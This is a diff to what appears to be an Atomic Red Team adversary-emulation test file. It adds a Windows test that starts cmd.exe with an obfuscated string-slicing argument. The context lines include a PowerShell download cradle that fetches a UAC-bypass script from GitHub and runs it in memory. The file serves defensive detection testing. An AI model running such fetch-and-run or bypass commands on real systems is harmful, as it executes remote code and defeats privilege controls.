@@ -197,6 +197,22 @@ atomic_tests:
         command: |
             Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
         name: command_prompt
+-   name: Obfuscation via String Slicing
+    auto_generated_guid:
+    description: |
+        Starts the process cmd.exe via powershell with command line parameters that contain string slicing.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        cmd_command:
+            description: cmd.exe command to execute
+            type: String
+            default: echo %AppData:~0,3%%ALLUSERSPROFILE:~3%
+    executor:
+        command: |
+            Start-Process cmd.exe -ArgumentList "#{cmd_command}"
+        name: powershell
+        elevation_required: false
 -   name: Run Bloodhound from Memory using Download Cradle
     auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
     description: |
